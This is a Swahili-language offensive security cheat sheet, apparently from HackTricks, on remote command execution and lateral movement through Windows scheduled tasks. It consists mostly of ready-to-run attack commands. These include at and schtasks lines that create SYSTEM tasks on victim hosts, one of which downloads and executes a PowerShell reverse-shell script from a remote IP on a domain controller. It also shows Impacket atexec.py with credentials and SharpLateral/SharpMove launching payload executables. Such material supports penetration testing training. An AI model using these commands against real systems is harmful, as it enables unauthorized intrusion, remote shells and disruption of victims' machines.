# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Jinsi Inavyofanya Kazi

At inaruhusu kupanga kazi katika mwenyeji ambapo unajua jina la mtumiaji/(nenosiri/Hash). Hivyo, unaweza kuitumia kutekeleza amri katika wenyeji wengine na kupata matokeo.
```
At \\victim 11:00:00PM shutdown -r
```
Kwa kutumia schtasks unahitaji kwanza kuunda kazi na kisha kuitaja:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Unaweza kutumia **Impacket's `atexec.py`** kutekeleza amri kwenye mifumo ya mbali kwa kutumia amri ya AT. Hii inahitaji akreditif za halali (jina la mtumiaji na nenosiri au hash) kwa ajili ya mfumo wa lengo.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
Unaweza pia kutumia [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Unaweza kutumia [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Zaidi ya habari kuhusu [**matumizi ya schtasks na tiketi za fedha hapa**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
